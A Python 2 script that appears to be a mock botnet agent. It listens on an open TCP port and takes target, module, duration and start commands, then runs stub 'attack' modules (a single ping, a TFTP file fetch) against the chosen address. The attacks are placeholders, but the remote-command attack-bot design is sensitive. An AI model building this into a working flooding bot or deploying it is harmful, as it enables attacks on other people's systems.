#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import os
import sys
import time
import thread
import random
import logging
import ConfigParser


from time import gmtime, strftime

# Read config file
# The config file should be in the same directory as the python script
# It's name is hardcoded for now, can become a command-line parameter

my_config = ConfigParser.ConfigParser()
my_config.read("./mcp.log")

# Start logging
# Right now, we're logging into a file and print everything on screen. Disable next global if you'd like to omit screen output.

logging.basicConfig(filename="./mcp.txt", level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
logging.debug("Start of program mcp.py")

# General section
try:
    ConnectionMaxTime = my_config.get("General", "ConnectionMaxTime")
    if (int(ConnectionMaxTime) < 1 or int(ConnectionMaxTime) > 300):
        ConnectionMaxTime = 60 #default
except:
    ConnectionMaxTime = 60 #default
    print "Couldn't read ConnectionMaxTime from config"
    logging.error("Couldn't read ConnectionMaxTime from config")

try:
    PortNumber = my_config.get("General", "PortNumber")
    if (int(PortNumber) < 1024 or int(PortNumber) > 65535):
        PortNumber = 20050 #default
except:
    PortNumber = 20050
    print "Couldn't read PortNumber from config"
    logging.error("Couldn't read PortNumber from config")

try:
    MaxConnections = my_config.get("General", "MaxConnections")
    if (int(MaxConnections) < 1 or int(MaxConnections) > 5):
        MaxConnections = 3 #default
except:
    MaxConnections = 3
    print "Couldn't read MaxConnections from config"
    logging.error("Couldn't read MaxConnections from config")

#ConnectionMaxTime = 20
#PortNumber = 20050
#MaxConnections = 3

ConnectionAttempts = 0
StayAlive = True
StillRunningTimer = 30

# functions

global_ende = 0
global_threads_max = 2
global_debug = True

def time_zeile(worker_id):
    zeitstempel = strftime("%Y-%d-%m %H:%M:%S", gmtime())
    if worker_id > 0:
        zeile = "[ " + zeitstempel + " ] worker_id " + str(worker_id) + " "
    else:
        zeile = "[ " + zeitstempel + " ] *** MAIN *** "
    return (zeile)

def add_one_to_global_ende():
    global global_ende
    global global_threads_max
    global global_debug

    global_ende = global_ende + 1

    if global_debug == True:
        print time_zeile(0) + "Global Ende = " + str(global_ende)
        logging.info("Global Ende = " + str(global_ende))

def m_stresser(my_target, my_duration):
    # Ignore Duration for now
    os.system("ping -c 1 %s" % my_target)

def m_tftp(my_target, my_duration):
    # Ignore Duration for now
    os.system("tftp -m bin %s -c GET some_random.file" %(my_target))

def start_attack(my_target, my_module, my_duration):
    try:
        socket.inet_aton(my_target)
        # legal
    except socket.error:
        my_target = "127.0.0.1"

    if int(my_duration) < 1 or int(my_duration) > 15:
        my_duration = 3
    else:
        my_duration = int(my_duration)

    if my_module == "stresser":
        m_stresser(my_target, my_duration)
    elif my_module == "tftp":
        m_tftp(my_target, my_duration)
    else:
        pass

def kill_me_after_n(socket, seconds):
    global global_debug
    if global_debug == True:
        print time_zeile(99) + "Start closing timer..."
    time.sleep(seconds)
    if global_debug == True:
        print time_zeile(99) + "Closing socket due to timeout"
    socket.close()
    add_one_to_global_ende()

def open_socket(my_socket, port):
    try:
        my_socket.bind(("0.0.0.0", port))
    except IOError as e:
        print "I/O error({0}): {1}".format(e.errno, e.strerror)
        return False

def random_high_port():
    return random.randint(1024, 65535)

def open_and_listen(port, worker_id):
    global global_debug
    StayAlive = True
    EndCall = False

    my_target = ""
    my_module = ""
    my_duration = ""
    my_start = ""

    bot_service = "AYBABTU v0.33"

    s = socket.socket()
    try:
        s.bind(("0.0.0.0", port))
    except IOError as e:
        my_info = time_zeile(worker_id) + "I/O error({0}): {1} [worker {2}]".format(e.errno, e.strerror, worker_id)
        print my_info
        logging.info(my_info)
        StayAlive = False

    while (StayAlive == True):
        if (global_debug == True):
            print time_zeile(worker_id) + "pre-listen..."

        s.listen(5)

        if (global_debug == True):
            print time_zeile(worker_id) + "...post-listen"

        try:
            if (global_debug == True):
                print time_zeile(worker_id) + "pre-accept..."

            c, addr = s.accept()
            c.settimeout(30)
            if (global_debug == True):
                print time_zeile(worker_id) + "...post-accept"

            print time_zeile(worker_id) + "Connection from: " + str(addr)
        except IOError as e:
            print time_zeile(worker_id) + "I/O error({0}): {1}".format(e.errno, e.strerror)
            StayAlive = False
            break

        ConnectionAlive = True
        t0 = time.time()
        #kill_me_after_n(s, 30)
        #thread.start_new_thread( kill_me_after_n, (s, 30, ) )

        c.send(bot_service + " LISTENING\n")

        if (global_debug == True):
            print time_zeile(worker_id) + "Ticks start at " + str(t0)

        while (ConnectionAlive == True):
            try:
                if (global_debug == True):
                    print time_zeile(worker_id) + "pre-recv..."

                data = c.recv(1024)

                if (global_debug == True):
                    print time_zeile(worker_id) + "...post-recv"

            except IOError as e:
                print time_zeile(worker_id) + "I/O error({0}): {1}".format(e.errno, e.strerror)
                print time_zeile(worker_id) + "Closed or other error"
                ConnectionAlive = False
                StayAlive = False
                c.close()

            try:
                daten = str(data.strip())
            except UnboundLocalError:
                daten = time_zeile(worker_id) + "No data received."

            print time_zeile(worker_id) + "received data: " + daten

            split_daten = daten.split(' ',1)

            try:
                bot_cmd = split_daten[0]
            except IndexError:
                bot_cmd = "quit"

            try:
                bot_param = split_daten[1]
            except IndexError:
                bot_param = "now"


            bot_cmd = bot_cmd.lower()

            if bot_cmd == "target":
                my_target = bot_param
                c.send(bot_service + " TARGET %s\n" % (my_target))
                my_info = time_zeile(worker_id) + "Target has been set to %s" % (my_target)
                print my_info
                logging.info(my_info)
            elif bot_cmd == "mod" or bot_cmd == "module":
                my_module = bot_param
                c.send(bot_service + " MODULE %s\n" % (my_module))
                my_info = time_zeile(worker_id) + "Module has been set to %s" % (my_module)
                print my_info
                logging.info(my_info)
            elif bot_cmd == "dur" or bot_cmd == "duration":
                my_duration = bot_param
                c.send(bot_service + " DURATION %s\n" % (my_duration))
                my_info = time_zeile(worker_id) + "Duration has been set to %s" % (my_duration)
                print my_info
                logging.info(my_info)
            elif bot_cmd == "now" or bot_cmd == "start":
                if my_target != "" and my_module != "" and my_duration != "":
                    my_info = time_zeile(worker_id) + "Starting attack (tgt %s mod %s dur %s)" % (my_target, my_module, my_duration)
                    print my_info
                    logging.info(my_info)
                    thread.start_new_thread(start_attack, (my_target, my_module, my_duration ) )
                    c.send(bot_service + " STARTING...\n")
                    # in einem thread bitte start_attack(my_target, my_module, my_duration)
                else:
                    my_info = time_zeile(worker_id) + "Insufficent parameters:\nTarget: %s\nModule: %s\nDuration: %s" % (my_target, my_module, my_duration)
                    print my_info
                    logging.info(my_info)
                    c.send(bot_service + " Insufficent parameters:\nTarget: %s\nModule: %s\nDuration: %s" % (my_target, my_module, my_duration))

                EndCall = True
            elif bot_cmd == "quit" or bot_cmd == "bye" or bot_cmd == "exit":
                EndCall = True
            else:
                my_info = time_zeile(worker_id) + "CMD %s not understood" % (bot_cmd)
                print my_info
                logging.info(my_info)


            if EndCall == True:
                print time_zeile(worker_id) + " Caller disconnected."
                c.send(bot_service + " Bye!")
                ConnectionAlive = False
                StayAlive = False
                c.close()
                break


            if (int(time.time() - t0) > ConnectionMaxTime):
                print time_zeile(worker_id) + " Timeout " + str(t0)
                ConnectionAlive = False
                StayAlive = False
                c.close()

        try:
            c.close()
            print time_zeile(worker_id) + "Closed socket."
        except:
            print time_zeile(worker_id) + "Socket already closed, already in use or non-existant."

        add_one_to_global_ende()

print "Global Ende = " + str(global_ende)

try:
    if int(PortNumber) > 1023 and int(PortNumber) < 65535:
        my_port = int(PortNumber)
    else:
        my_port = 20050

    thread.start_new_thread( open_and_listen, (my_port, 1, ) )
    if global_debug == True:
        print time_zeile(0) + "Port " + str(my_port) + " opened and listening."

    #thread.start_new_thread( open_and_listen, (26000, 1, ) )
    #thread.start_new_thread( open_and_listen, (26100, 2, ) )
    #thread.start_new_thread( open_and_listen, (26200, 3, ) )
except:
    print "Error: unable to start thread"

while (global_ende < global_threads_max) :
    time.sleep(StillRunningTimer)
    print time_zeile(0) + "Still alive ----------------  " + str(global_ende) + " exited, max " + str(global_threads_max) + "  -----"
else:
    print time_zeile(0) + "All threads have finished their jobs, exiting... "
